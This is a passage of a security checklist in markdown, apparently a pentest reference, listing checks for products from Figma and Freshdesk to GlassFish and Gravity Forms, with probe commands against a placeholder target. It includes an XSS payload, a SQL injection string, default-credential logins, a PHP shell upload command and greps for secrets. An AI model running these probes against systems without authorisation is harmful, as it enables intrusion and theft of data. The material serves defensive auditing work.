**Commands:**
```bash
grep -r "figdraft\|figma" /var/www/ | grep -i "token\|key\|secret"
```

**References:**
- https://help.figma.com/hc/en-us/articles/8085703771159

### Check for public Figma files with sensitive content
<!-- id: figma-2 | severity: medium | tags: figma, public-files, info-disclosure -->
Figma files set to "Anyone with the link can view" may expose product designs with API endpoints, credentials, or internal infrastructure details.

**References:**
- https://help.figma.com/hc/en-us/articles/360040531773

---

## Freshdesk
<!-- id: freshdesk | icon: 🛠️ | color: #e06c75 -->
Security checklists for Freshdesk customer support platform.

### Check Freshdesk for exposed API key
<!-- id: freshdesk-1 | severity: high | tags: freshdesk, api-key, support-data -->
Freshdesk API keys allow full access to tickets, user data, and knowledge base articles.

**Commands:**
```bash
curl -s "https://DOMAIN.freshdesk.com/api/v2/tickets" -u "API_KEY:X"
curl -s "https://DOMAIN.freshdesk.com/api/v2/contacts" -u "API_KEY:X"
```

**References:**
- https://developers.freshdesk.com/api/

### Check for Freshdesk SSRF via webhooks
<!-- id: freshdesk-2 | severity: high | tags: freshdesk, ssrf, webhooks -->
Freshdesk webhooks can be configured to make HTTP requests to internal services, enabling SSRF attacks.

**References:**
- https://developers.freshdesk.com/api/#webhooks

### Check for public knowledge base exposure
<!-- id: freshdesk-3 | severity: medium | tags: freshdesk, knowledge-base, info-disclosure -->
Freshdesk knowledge base set to public may leak internal processes, troubleshooting steps, and product architecture details.

---

## Fresha
<!-- id: fresha | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fresha (formerly Shedul) beauty and wellness booking platform.

### Check Fresha for unauthenticated API access
<!-- id: fresha-1 | severity: high | tags: fresha, api, customer-data -->
Fresha APIs exposed without proper authentication may leak appointment data, customer PII, and business operations.

**Commands:**
```bash
curl -s "https://api.fresha.com/merchants/MERCHANT_ID/appointments"
```

**References:**
- https://developers.fresha.com/

### Check Fresha for IDOR in booking system
<!-- id: fresha-2 | severity: high | tags: fresha, idor, booking -->
Predictable appointment IDs may allow enumerating and modifying other customers' bookings.

**References:**
- https://www.fresha.com/

---

## Froala Editor
<!-- id: froala | icon: 🛠️ | color: #e06c75 -->
Security checklists for Froala WYSIWYG HTML editor.

### Check Froala for stored XSS via HTML content
<!-- id: froala-1 | severity: high | tags: froala, xss, wysiwyg, html-injection -->
Froala Editor allows full HTML input. Applications that render editor output without sanitization are vulnerable to stored XSS.

**Commands:**
```bash
// Test by inserting <img src=x onerror=alert(1)> into editor content
```

**References:**
- https://www.froala.com/wysiwyg-editor/docs/security

### Check Froala for exposed license key
<!-- id: froala-2 | severity: low | tags: froala, license-key, info-disclosure -->
Froala license keys embedded in frontend JavaScript can be harvested for unauthorized use.

**Commands:**
```bash
curl -s http://target.com | grep -i "froala\|licenseKey"
```

---

## FluxBB
<!-- id: fluxbb | icon: 🛠️ | color: #e06c75 -->
Security checklists for FluxBB lightweight forum software.

### Check FluxBB for SQL injection
<!-- id: fluxbb-1 | severity: critical | tags: fluxbb, sqli, forum -->
Older FluxBB versions are vulnerable to SQL injection in search, profile, and post parameters.

**Commands:**
```bash
curl -s "http://target.com/search.php?keywords=test' OR 1=1--"
```

**References:**
- https://fluxbb.org/

### Check FluxBB for exposed admin panel
<!-- id: fluxbb-2 | severity: high | tags: fluxbb, admin, brute-force -->
FluxBB admin panel with default or weak credentials allows full forum takeover.

**Commands:**
```bash
curl -s http://target.com/admin/
```

**References:**
- https://fluxbb.org/docs/

---

## Forgejo
<!-- id: forgejo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Forgejo self-hosted Git service.

### Check Forgejo for open registration
<!-- id: forgejo-1 | severity: medium | tags: forgejo, git, open-registration -->
Forgejo instances with open registration allow anyone to create accounts and access public repositories.

**Commands:**
```bash
curl -s http://target.com/user/sign_up | grep -i "register\|sign up"
```

**References:**
- https://forgejo.org/docs/latest/user/security/

### Check Forgejo for public repository data exposure
<!-- id: forgejo-2 | severity: high | tags: forgejo, source-code, info-disclosure -->
Public repositories on Forgejo may leak internal source code, CI/CD secrets, and infrastructure configuration.

**Commands:**
```bash
curl -s http://target.com/explore/repos
```

**References:**
- https://forgejo.org/docs/latest/user/security/

---

## Fedora
<!-- id: fedora | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fedora Linux servers.

### Check Fedora for outdated packages with known CVEs
<!-- id: fedora-1 | severity: high | tags: fedora, linux, vuln-scan -->
Unpatched Fedora packages expose the server to known exploits.

**Commands:**
```bash
dnf check-update
dnf list --security --updates
```

**References:**
- https://docs.fedoraproject.org/en-US/quick-docs/package-security/

### Check Fedora for SELinux status
<!-- id: fedora-2 | severity: medium | tags: fedora, selinux, hardening -->
Fedora ships with SELinux enabled by default. Disabled SELinux removes a critical security layer.

**Commands:**
```bash
getenforce
sestatus
```

**References:**
- https://docs.fedoraproject.org/en-US/quick-docs/selinux/

---

## FingerprintJS
<!-- id: fingerprintjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for FingerprintJS browser fingerprinting library.

### Check for FingerprintJS bot detection bypass
<!-- id: fingerprintjs-1 | severity: medium | tags: fingerprintjs, bot-detection, fingerprinting -->
Attackers using headless browsers or puppeteer-extra-stealth may bypass FingerprintJS visitor identification.

**Commands:**
```bash
// Test with puppeteer-extra and stealth plugin
```

**References:**
- https://dev.fingerprint.com/docs

### Check for FingerprintJS API key exposure
<!-- id: fingerprintjs-2 | severity: medium | tags: fingerprintjs, api-key, tracking -->
Exposed FingerprintJS API keys allow unauthorized visitor identification and data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "fingerprintjs\|fpjs"
```

**References:**
- https://dev.fingerprint.com/docs

---

## FilamentPHP
<!-- id: filamentphp | icon: 🛠️ | color: #e06c75 -->
Security checklists for FilamentPHP Laravel admin panel framework.

### Check Filament for exposed admin panel
<!-- id: filament-1 | severity: high | tags: filamentphp, admin, laravel, info-disclosure -->
Filament admin panel at /admin with weak credentials grants full database CRUD access through the generated panels.

**Commands:**
```bash
curl -s http://target.com/admin
curl -s http://target.com/admin/login
```

**References:**
- https://filamentphp.com/docs/security

### Check Filament for mass assignment via panel resources
<!-- id: filament-2 | severity: high | tags: filamentphp, mass-assignment, authorization -->
Filament panels may expose create/edit forms for protected attributes if authorization policies are not properly configured.

**References:**
- https://filamentphp.com/docs/panels/authorization

---

## Frappe / ERPNext
<!-- id: frappe | icon: 🛠️ | color: #e06c75 -->
Security checklists for Frappe framework and ERPNext ERP platform.

### Check Frappe for exposed desk with default credentials
<!-- id: frappe-1 | severity: critical | tags: frappe, erpnext, default-creds, erp -->
Frappe/ERPNext default credentials (Administrator/admin) grant full access to the ERP system including customer PII, financial data, and HR records.

**Commands:**
```bash
curl -s http://target.com:8000/
curl -s http://target.com:8000/api/method/login -d '{"usr":"Administrator","pwd":"admin"}'
```

**References:**
- https://frappeframework.com/docs/user/en/security

### Check Frappe for SSRF via webhook/integration
<!-- id: frappe-2 | severity: high | tags: frappe, ssrf, webhooks -->
Frappe webhook integrations may be abused for SSRF attacks against internal services.

**References:**
- https://frappeframework.com/docs/user/en/webhooks

---

## Freshworks CRM
<!-- id: freshworks-crm | icon: 🛠️ | color: #e06c75 -->
Security checklists for Freshworks CRM customer relationship platform.

### Check Freshworks CRM for exposed API key
<!-- id: freshworks-crm-1 | severity: high | tags: freshworks, crm, api-key, customer-data -->
Exposed Freshworks CRM API keys allow full access to contacts, deals, and communications.

**Commands:**
```bash
curl -s "https://DOMAIN.freshworks.com/crm/sales/api/contacts" -H "Authorization: Token token=API_KEY"
```

**References:**
- https://developers.freshworks.com/crm/api/

### Check for SSRF via Freshworks CRM webhooks
<!-- id: freshworks-crm-2 | severity: high | tags: freshworks, ssrf, webhooks -->
Freshworks CRM webhooks can be configured to reach internal services, enabling SSRF.

**References:**
- https://developers.freshworks.com/crm/api/#webhooks

---

## Form.io
<!-- id: formio | icon: 🛠️ | color: #e06c75 -->
Security checklists for Form.io form building platform.

### Check Form.io for exposed form submissions
<!-- id: formio-1 | severity: high | tags: formio, forms, data-exposure -->
Form.io forms without proper submission authentication expose all submitted data including PII.

**Commands:**
```bash
curl -s "https://DOMAIN.form.io/FORM_NAME/submission"
```

**References:**
- https://help.form.io/deployment/security

### Check Form.io for role/permission misconfiguration
<!-- id: formio-2 | severity: medium | tags: formio, roles, authorization -->
Form.io roles misconfigured as public may allow unauthorized form submission viewing or modification.

**References:**
- https://help.form.io/userguide/roles

---

## Formstack
<!-- id: formstack | icon: 🛠️ | color: #e06c75 -->
Security checklists for Formstack online form builder.

### Check Formstack for exposed data via form iframe
<!-- id: formstack-1 | severity: medium | tags: formstack, forms, data-exposure -->
Formstack forms embedded in iframes may expose submission data if the form has public submission viewing enabled.

**Commands:**
```bash
curl -s http://target.com | grep -i "formstack\|form\.io\|fsforms"
```

**References:**
- https://www.formstack.com/security

---

## Flodesk
<!-- id: flodesk | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flodesk email marketing platform.

### Check Flodesk for exposed API keys in source code
<!-- id: flodesk-1 | severity: high | tags: flodesk, email, api-key, subscriber-data -->
Exposed Flodesk API keys allow unauthorized access to subscriber lists and email campaign data.

**Commands:**
```bash
grep -r "flodesk" /var/www/ | grep -i "key\|token\|secret"
```

**References:**
- https://developers.flodesk.com/

### Check Flodesk embed for subscriber data leakage
<!-- id: flodesk-2 | severity: medium | tags: flodesk, embed, subscriber-exposure -->
Flodesk email capture forms embedded on websites may leak subscriber information in form submissions.

---

## Flyspray
<!-- id: flyspray | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flyspray open-source bug tracking software.

### Check Flyspray for unauthenticated access
<!-- id: flyspray-1 | severity: high | tags: flyspray, bug-tracker, info-disclosure -->
Flyspray instances without authentication expose all project bugs, internal discussions, and development details.

**Commands:**
```bash
curl -s http://target.com/flyspray/
curl -s http://target.com/flyspray/index.php?do=details&task_id=1
```

**References:**
- https://flyspray.org/

### Check Flyspray for default admin credentials
<!-- id: flyspray-2 | severity: critical | tags: flyspray, default-creds, admin -->
Flyspray default admin credentials (admin/admin) grant full project management and PHP code access.

**References:**
- https://docs.flyspray.org/

---

## FullCalendar
<!-- id: fullcalendar | icon: 🛠️ | color: #e06c75 -->
Security checklists for FullCalendar JavaScript event calendar library.

### Check FullCalendar for exposed API endpoints
<!-- id: fullcalendar-1 | severity: medium | tags: fullcalendar, api, data-exposure -->
FullCalendar configured with remote event sources may expose the underlying JSON API endpoints revealing private calendar data.

**Commands:**
```bash
curl -s http://target.com | grep -i "fullcalendar\|FullCalendar"
// Look for eventSources or events configuration
```

**References:**
- https://fullcalendar.io/docs/event-source

---

## FunCaptcha
<!-- id: funcaptcha | icon: 🛠️ | color: #e06c75 -->
Security checklists for FunCaptcha (now Arkose Labs) bot detection.

### Check FunCaptcha for bypass via token reuse
<!-- id: funcaptcha-1 | severity: high | tags: funcaptcha, captcha-bypass, bot-detection -->
FunCaptcha tokens may be reusable or bypassable if the server-side verification is missing or incorrectly implemented.

**Commands:**
```bash
// Submit the same FunCaptcha token multiple times to test replay
```

**References:**
- https://developer.arkoselabs.com/

### Check for missing FunCaptcha server-side verification
<!-- id: funcaptcha-2 | severity: high | tags: funcaptcha, captcha, missing-verification -->
Applications that only verify the captcha client-side can be trivially bypassed by directly submitting forms without solving the challenge.

**References:**
- https://developer.arkoselabs.com/docs/server-side-integration

---

## Fathom Analytics
<!-- id: fathom | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fathom Analytics privacy-focused analytics.

### Check Fathom for exposed dashboard share links
<!-- id: fathom-1 | severity: medium | tags: fathom, analytics, share-link -->
Fathom public share links expose website traffic analytics, visitor numbers, and top pages to anyone with the URL.

**Commands:**
```bash
curl -s http://target.com | grep -i "fathom\|cdn.usefathom.com"
```

**References:**
- https://usefathom.com/features/share-links

---

## Flickity
<!-- id: flickity | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flickity JavaScript carousel library.

### Check for outdated Flickity version with known XSS
<!-- id: flickity-1 | severity: medium | tags: flickity, xss, javascript-library -->
Older versions of Flickity may have XSS vulnerabilities via cellSelector option or HTML-based slide content.

**Commands:**
```bash
curl -s http://target.com | grep -i "flickity\|flickity.pkgd"
```

**References:**
- https://flickity.metafizzy.co/

---

## Fluent Forms
<!-- id: fluent-forms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fluent Forms WordPress plugin.

### Check Fluent Forms for file upload vulnerabilities
<!-- id: fluent-forms-1 | severity: high | tags: fluent-forms, wordpress, file-upload -->
Fluent Forms file upload fields without proper extension restrictions allow uploading PHP files leading to RCE.

**Commands:**
```bash
// Upload a .php file through the form and check if it's accessible
```

**References:**
- https://fluentforms.com/docs/security/

### Check Fluent Forms for SQL injection
<!-- id: fluent-forms-2 | severity: high | tags: fluent-forms, sqli, wordpress -->
Form submissions with unsanitized input may lead to SQL injection in the submissions database.

**References:**
- https://wordpress.org/plugins/fluentform/

---

## FusionCharts
<!-- id: fusioncharts | icon: 🛠️ | color: #e06c75 -->
Security checklists for FusionCharts JavaScript charting library.

### Check FusionCharts for XSS via data injection
<!-- id: fusioncharts-1 | severity: medium | tags: fusioncharts, xss, charting -->
FusionCharts rendering user-supplied data in chart labels or tooltips without sanitization may lead to XSS.

**Commands:**
```bash
// Inject <img src=x onerror=alert(1)> in chart data labels
```

**References:**
- https://www.fusioncharts.com/dev/security

---

## Fomo
<!-- id: fomo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fomo social proof notification platform.

### Check Fomo for exposed API keys in JavaScript
<!-- id: fomo-1 | severity: medium | tags: fomo, api-key, social-proof -->
Fomo API keys embedded in frontend JavaScript may be scraped for unauthorized notification manipulation.

**Commands:**
```bash
curl -s http://target.com | grep -i "fomo"
```

**References:**
- https://fomo.com/security

---

## Frappe (Check additional)
<!-- id: frappe-check | icon: 🛠️ | color: #e06c75 -->
Additional security considerations for Frappe framework applications.

### Check for exposed bench/developer endpoints
<!-- id: frappe-check-1 | severity: high | tags: frappe, bench, dev-endpoints -->
Frappe's bench console or developer mode endpoints may expose database access and server internals.

**Commands:**
```bash
curl -s http://target.com:8000/console
curl -s http://target.com:8000/api/method/frappe.utils.setup.docs
```

**References:**
- https://frappeframework.com/docs/user/en/security

---

## Gatsby
<!-- id: gatsby | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gatsby React-based static site generator.

### Check Gatsby for GraphQL endpoint exposure in production
<!-- id: gatsby-1 | severity: high | tags: gatsby, graphql, info-disclosure -->
Gatsby builds may leave the GraphQL endpoint exposed, allowing querying of all site data, content, and internal page metadata.

**Commands:**
```bash
curl -s http://target.com/___graphql
curl -X POST http://target.com/___graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'
```

**References:**
- https://www.gatsbyjs.com/docs/how-to/querying-data/running-queries-with-graphiql/

### Check Gatsby for source map exposure
<!-- id: gatsby-2 | severity: medium | tags: gatsby, source-map, info-disclosure -->
Gatsby may leave source maps in the build output exposing original component source code and API keys.

**Commands:**
```bash
curl -s http://target.com/component---src-pages-index-1.js.map | head -20
curl -s http://target.com/webpack-runtime-*.js.map 2>/dev/null
```

**References:**
- https://www.gatsbyjs.com/docs/how-to/previews-deploys-and-hosting/how-gatsby-works-with-github-pages/

### Check Gatsby for exposed environment variables
<!-- id: gatsby-3 | severity: high | tags: gatsby, env-vars, secrets -->
Gatsby inlines environment variables prefixed with GATSBY_ into the client-side bundle, potentially exposing API keys and secrets.

**Commands:**
```bash
curl -s http://target.com | grep -oE 'GATSBY_[A-Z_]+["\s:=]+["][^"]+["]'
```

**References:**
- https://www.gatsbyjs.com/docs/how-to/local-development/environment-variables/

---

## Gerrit
<!-- id: gerrit | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gerrit code review platform.

### Check Gerrit for unauthenticated repository access
<!-- id: gerrit-1 | severity: high | tags: gerrit, code-review, unauthorized-access -->
Gerrit instances may expose private repositories, code changes, and user information to unauthenticated visitors.

**Commands:**
```bash
curl -s http://target.com:8080/
curl -s http://target.com:8080/projects/
curl -s http://target.com:8080/changes/
```

**References:**
- https://www.gerritcodereview.com/

### Check Gerrit for default admin credentials
<!-- id: gerrit-2 | severity: critical | tags: gerrit, default-creds, admin -->
Gerrit default admin access grants full control over projects, user accounts, and code reviews.

**Commands:**
```bash
curl -s -u admin:admin "http://target.com:8080/projects/"
```

**References:**
- https://gerrit-review.googlesource.com/Documentation/config-gerrit.html

### Check Gerrit for exposed REST API without authentication
<!-- id: gerrit-3 | severity: high | tags: gerrit, rest-api, info-disclosure -->
Gerrit's REST API may expose change details, commit messages, and patch sets without authentication.

**Commands:**
```bash
curl -s http://target.com:8080/a/config/server/info
curl -s http://target.com:8080/a/projects/ | head -50
```

**References:**
- https://gerrit-review.googlesource.com/Documentation/rest-api.html

---

## GitBook
<!-- id: gitbook | icon: 🛠️ | color: #e06c75 -->
Security checklists for GitBook documentation platform.

### Check GitBook for private documentation exposure
<!-- id: gitbook-1 | severity: high | tags: gitbook, documentation, info-disclosure -->
GitBook spaces set to public may leak internal documentation, API keys, authentication flows, and infrastructure details.

**Commands:**
```bash
curl -s https://TARGET.gitbook.io/
curl -s https://TARGET.gitbook.io/v/SPACE_ID/
```

**References:**
- https://docs.gitbook.com/security/overview

### Check GitBook for exposed search API
<!-- id: gitbook-2 | severity: medium | tags: gitbook, search, api -->
GitBook's search API may expose content from private spaces if the integration token is exposed in the page.

**Commands:**
```bash
curl -s http://target.com | grep -i "gitbook"
```

**References:**
- https://docs.gitbook.com/api-reference/api-reference

---

## GitHub Pages
<!-- id: github-pages | icon: 🛠️ | color: #e06c75 -->
Security checklists for GitHub Pages static site hosting.

### Check GitHub Pages for custom domain takeover
<!-- id: github-pages-1 | severity: high | tags: github-pages, subdomain-takeover, dns -->
When a GitHub Pages custom domain's repository is deleted or the CNAME is removed, the domain becomes vulnerable to takeover by registering a new GitHub Pages site.

**Commands:**
```bash
dig target.com CNAME +short
// If CNAME points to *.github.io and returns 404, it's takoverable
curl -s http://target.com | grep -i "404\|there isn't a GitHub Pages site"
```

**References:**
- https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site

### Check GitHub Pages for exposed repository metadata
<!-- id: github-pages-2 | severity: medium | tags: github-pages, info-disclosure, metadata -->
GitHub Pages sites may expose the commit hash, source repository, and build information in HTTP headers or page source.

**Commands:**
```bash
curl -sI http://target.com | grep -i "x-github\|x-repo"
curl -s http://target.com | grep -i "github"
```

**References:**
- https://docs.github.com/en/pages/getting-started-with-github-pages

---

## GitLab CI/CD
<!-- id: gitlab-ci | icon: 🛠️ | color: #e06c75 -->
Security checklists for GitLab CI/CD pipeline configuration.

### Check GitLab CI/CD for exposed pipeline variables
<!-- id: gitlab-ci-1 | severity: critical | tags: gitlab, cicd, variables, secrets -->
CI/CD variables containing API keys, cloud credentials, and tokens may be leaked through pipeline logs, artifacts, or branch pipelines running on unprotected branches.

**Commands:**
```bash
// Check if pipelines run on forked MRs
curl -s "https://gitlab.com/api/v4/projects/PROJECT_ID/variables" -H "PRIVATE-TOKEN: YOUR_TOKEN"
```

**References:**
- https://docs.gitlab.com/ee/ci/variables/

### Check GitLab CI/CD for artifact exposure
<!-- id: gitlab-ci-2 | severity: high | tags: gitlab, cicd, artifacts, exposure -->
CI/CD job artifacts stored without expiration may contain sensitive files, build outputs, or environment dumps.

**Commands:**
```bash
curl -s "https://gitlab.com/api/v4/projects/PROJECT_ID/jobs/artifacts" -H "PRIVATE-TOKEN: YOUR_TOKEN"
```

**References:**
- https://docs.gitlab.com/ee/ci/jobs/job_artifacts.html

### Check GitLab CI/CD for unauthorized pipeline triggers
<!-- id: gitlab-ci-3 | severity: high | tags: gitlab, cicd, pipeline-triggers -->
External pipeline triggers without proper token protection allow unauthorized execution of CI/CD pipelines.

**References:**
- https://docs.gitlab.com/ee/ci/triggers/

---

## GlassFish
<!-- id: glassfish | icon: 🛠️ | color: #e06c75 -->
Security checklists for Oracle GlassFish application server.

### Check GlassFish admin console for default credentials
<!-- id: glassfish-1 | severity: critical | tags: glassfish, admin, default-creds -->
GlassFish admin console on port 4848 with default credentials (admin/adminadmin) grants full server control including application deployment and RCE.

**Commands:**
```bash
curl -s http://target.com:4848/
curl -s -u admin:adminadmin http://target.com:4848/management/domain
```

**References:**
- https://javaee.github.io/glassfish/documentation

### Check GlassFish for exposed JMX/RMI ports
<!-- id: glassfish-2 | severity: critical | tags: glassfish, jmx, rmi, rce -->
GlassFish exposes JMX and RMI ports that may be accessed without authentication, leading to arbitrary code execution via MBean manipulation.

**Commands:**
```bash
nmap -p 8686,3700,4444,4848 target.com
```

**References:**
- https://javaee.github.io/glassfish/doc/security-guide.pdf

### Check GlassFish for directory listing
<!-- id: glassfish-3 | severity: medium | tags: glassfish, directory-listing, info-disclosure -->
GlassFish default configurations may enable directory listing, exposing application files and configuration.

**Commands:**
```bash
curl -s http://target.com:8080/
```

**References:**
- https://javaee.github.io/glassfish/

---

## Glitch
<!-- id: glitch | icon: 🛠️ | color: #e06c75 -->
Security checklists for Glitch web application hosting platform.

### Check Glitch for exposed .env or source code
<!-- id: glitch-1 | severity: high | tags: glitch, env, source-code, info-disclosure -->
Glitch projects may expose environment variables, source code, and API keys through the editor interface or debug endpoints.

**Commands:**
```bash
curl -s https://PROJECT.glitch.me/.env
curl -s https://PROJECT.glitch.me/.data
```

**References:**
- https://help.glitch.com/security/

### Check Glitch for remix/unauthenticated project cloning
<!-- id: glitch-2 | severity: medium | tags: glitch, remix, cloning -->
Glitch projects with public remixing enabled allow anyone to clone the full source code and environment variables.

**References:**
- https://help.glitch.com/security/

---

## Go (Golang)
<!-- id: go | icon: 🛠️ | color: #e06c75 -->
Security checklists for Go programming language applications.

### Check Go application for exposed pprof debugging endpoints
<!-- id: go-1 | severity: high | tags: go, pprof, debug, info-disclosure -->
Go applications importing net/http/pprof expose debugging endpoints at /debug/pprof/ that leak stack traces, memory profiles, and application internals.

**Commands:**
```bash
curl -s http://target.com/debug/pprof/
curl -s http://target.com/debug/pprof/goroutine?debug=2 | head -50
curl -s http://target.com/debug/pprof/heap?debug=1
```

**References:**
- https://pkg.go.dev/net/http/pprof

### Check Go application for exposed /debug endpoints
<!-- id: go-2 | severity: medium | tags: go, debug, info-disclosure -->
Go applications with expvar or pprof enabled may expose sensitive runtime metrics and configuration.

**Commands:**
```bash
curl -s http://target.com/debug/vars
curl -s http://target.com/debug/requests
```

**References:**
- https://pkg.go.dev/expvar

### Check Go binary for hardcoded secrets
<!-- id: go-3 | severity: high | tags: go, binary, secrets, reverse-engineering -->
Static analysis of Go binaries may reveal embedded API keys, database credentials, and JWT signing keys compiled into the application.

**Commands:**
```bash
strings target-binary | grep -i "api_key\|secret\|password\|token\|key="
go tool objdump target-binary | grep -i "secret\|key\|token"
```

**References:**
- https://go.dev/doc/security/

---

## GSAP (GreenSock)
<!-- id: gsap | icon: 🛠️ | color: #e06c75 -->
Security checklists for GSAP animation library.

### Check GSAP for CDN script integrity and outdated versions
<!-- id: gsap-1 | severity: low | tags: gsap, cdn, integrity, javascript-library -->
GSAP loaded from CDNs without SRI integrity checks may be vulnerable to supply chain attacks if the CDN is compromised.

**Commands:**
```bash
curl -s http://target.com | grep -i "gsap\|greensock"
```

**References:**
- https://greensock.com/docs/

---

## Gentoo Linux
<!-- id: gentoo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gentoo Linux servers.

### Check Gentoo for outdated packages
<!-- id: gentoo-1 | severity: high | tags: gentoo, linux, vuln-scan -->
Unpatched Gentoo packages expose the server to known exploits.

**Commands:**
```bash
emerge --sync
emerge -pvuDN @world
glsa-check -l
```

**References:**
- https://www.gentoo.org/security/

### Check Gentoo for hardened kernel configuration
<!-- id: gentoo-2 | severity: medium | tags: gentoo, kernel, hardening -->
Gentoo's hardened profile enables PaX, SELinux, and other kernel protections. Verify they are active.

**Commands:**
```bash
cat /etc/portage/make.conf | grep -i "hardened"
gcc-config -l
```

**References:**
- https://wiki.gentoo.org/wiki/Hardened_Gentoo

---

## GTranslate
<!-- id: gtranslate | icon: 🛠️ | color: #e06c75 -->
Security checklists for GTranslate website translation plugin.

### Check GTranslate for API key exposure
<!-- id: gtranslate-1 | severity: medium | tags: gtranslate, translation, api-key -->
GTranslate API keys embedded in client-side JavaScript may be scraped for unauthorized translation usage.

**Commands:**
```bash
curl -s http://target.com | grep -i "gtranslate\|gt_"
```

**References:**
- https://gtranslate.io/

---

## GeeTest CAPTCHA
<!-- id: geetest | icon: 🛠️ | color: #e06c75 -->
Security checklists for GeeTest CAPTCHA (slide/behavioral verification).

### Check GeeTest for missing server-side verification
<!-- id: geetest-1 | severity: high | tags: geetest, captcha, bypass -->
Applications that skip server-side GeeTest validation allow form submission without solving the captcha challenge.

**Commands:**
```bash
// Submit the form directly without the validate/geetest_challenge parameters
```

**References:**
- https://www.geetest.com/en/developer

### Check GeeTest for token replay
<!-- id: geetest-2 | severity: medium | tags: geetest, captcha, token-reuse -->
GeeTest tokens may be reusable if the server does not enforce one-time use validation.

**References:**
- https://www.geetest.com/en/developer

---

## Genially
<!-- id: genially | icon: 🛠️ | color: #e06c75 -->
Security checklists for Genially interactive content platform.

### Check Genially for exposed API keys or embed tokens
<!-- id: genially-1 | severity: medium | tags: genially, embed, tokens -->
Genially embed tokens may be exposed in page source, allowing unauthorized content manipulation or access to private presentations.

**Commands:**
```bash
curl -s http://target.com | grep -i "genially\|genial.ly"
```

**References:**
- https://genially.com/security/

---

## GetResponse
<!-- id: getresponse | icon: 🛠️ | color: #e06c75 -->
Security checklists for GetResponse email marketing platform.

### Check GetResponse for exposed API key
<!-- id: getresponse-1 | severity: high | tags: getresponse, api-key, email, subscriber-data -->
Exposed GetResponse API keys allow unauthorized access to subscriber lists, campaign data, and email automation workflows.

**Commands:**
```bash
curl -s "https://api.getresponse.com/v3/accounts" -H "X-Auth-Token: api-key API_KEY"
curl -s "https://api.getresponse.com/v3/contacts" -H "X-Auth-Token: api-key API_KEY"
```

**References:**
- https://apidocs.getresponse.com/

---

## GetSimple CMS
<!-- id: getsimple | icon: 🛠️ | color: #e06c75 -->
Security checklists for GetSimple flat-file CMS.

### Check GetSimple for exposed admin panel
<!-- id: getsimple-1 | severity: high | tags: getsimple, cms, admin, file-upload -->
GetSimple CMS admin panel at /admin with weak credentials allows PHP file upload and template modification leading to RCE.

**Commands:**
```bash
curl -s http://target.com/admin/
```

**References:**
- https://get-simple.info/

### Check GetSimple for public XML data exposure
<!-- id: getsimple-2 | severity: high | tags: getsimple, xml, info-disclosure -->
GetSimple stores page data in XML files that may be accessible directly, exposing page content and metadata.

**Commands:**
```bash
curl -s http://target.com/data/pages/
curl -s http://target.com/data/other/
```

**References:**
- https://get-simple.info/wiki/security

---

## Glia (formerly SaleMove)
<!-- id: glia | icon: 🛠️ | color: #e06c75 -->
Security checklists for Glia digital customer engagement platform.

### Check Glia for API key exposure in JavaScript
<!-- id: glia-1 | severity: medium | tags: glia, engagement, api-key, co-browsing -->
Glia API keys in client-side JavaScript may expose co-browsing sessions and customer communication data.

**Commands:**
```bash
curl -s http://target.com | grep -i "glia\|sale_move\|glom"
```

**References:**
- https://glia.com/security

---

## GoDaddy Website Builder
<!-- id: godaddy | icon: 🛠️ | color: #e06c75 -->
Security checklists for GoDaddy Website Builder hosted sites.

### Check GoDaddy sites for default content exposure
<!-- id: godaddy-1 | severity: low | tags: godaddy, website-builder, hosting -->
GoDaddy-created sites may have default pages, placeholder content, or staging areas that expose business information.

**Commands:**
```bash
curl -sI http://target.com | grep -i "godaddy\|secureserver"
```

**References:**
- https://www.godaddy.com/help/website-security

### Check GoDaddy for exposed staging or preview sites
<!-- id: godaddy-2 | severity: medium | tags: godaddy, staging, preview -->
GoDaddy staging URLs may expose unfinished site versions with private information.

**References:**
- https://www.godaddy.com/help

---

## Glide.js
<!-- id: glide | icon: 🛠️ | color: #e06c75 -->
Security checklists for Glide.js JavaScript slider library.

### Check for outdated Glide.js with XSS vulnerabilities
<!-- id: glide-1 | severity: medium | tags: glide, slider, xss, javascript-library -->
Older Glide.js versions may have XSS vulnerabilities in slide content rendering.

**Commands:**
```bash
curl -s http://target.com | grep -i "glide\.\|glidejs"
```

**References:**
- https://glidejs.com/

---

## Giscus
<!-- id: giscus | icon: 🛠️ | color: #e06c75 -->
Security checklists for Giscus comment system powered by GitHub Discussions.

### Check Giscus for repo/comment data leakage
<!-- id: giscus-1 | severity: medium | tags: giscus, comments, github, discussions -->
Giscus comments are stored in public GitHub Discussions repositories. If the repo is public, all comments and user data are publicly accessible.

**Commands:**
```bash
curl -s http://target.com | grep -i "giscus\|data-repo\|data-repo-id"
```

**References:**
- https://giscus.app/

---

## Gcore
<!-- id: gcore | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gcore CDN and edge services.

### Check Gcore for origin IP exposure
<!-- id: gcore-1 | severity: high | tags: gcore, cdn, origin-exposure -->
Gcore-concealed origin servers may be discovered via certificate transparency logs or DNS enumeration.

**Commands:**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**References:**
- https://gcore.com/docs/cdn

---

## Gravity Forms
<!-- id: gravity-forms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gravity Forms WordPress plugin.

### Check Gravity Forms for file upload vulnerabilities
<!-- id: gravity-1 | severity: high | tags: gravity-forms, wordpress, file-upload, rce -->
Gravity Forms file upload fields with improper extension validation allow uploading PHP files leading to RCE.

**Commands:**
```bash
// Upload a .php file through the form and check if it's accessible
curl -s -F "field_name=@shell.php" -F "gform_submit=1" http://target.com/wp-json/gf/v2/forms/FORM_ID/submissions
```

**References:**
- https://docs.gravityforms.com/security-white-paper/

### Check Gravity Forms for form data exposure via REST API
<!-- id: gravity-2 | severity: high | tags: gravity-forms, rest-api, data-exposure -->
